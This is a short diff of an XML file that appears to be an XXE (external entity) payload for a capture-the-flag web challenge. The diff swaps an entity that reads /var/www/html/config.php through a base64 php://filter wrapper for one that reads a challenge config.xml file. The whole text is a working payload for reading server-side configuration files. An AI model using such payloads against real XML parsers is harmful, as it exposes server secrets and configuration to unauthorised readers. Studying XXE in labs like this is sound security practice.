@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
 	<!ELEMENT root ANY>
-	<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
+	<!ENTITY xxe SYSTEM "file:///challenge/web-serveur/ch29/config.xml">
 ]>
 <root>
 	&xxe;
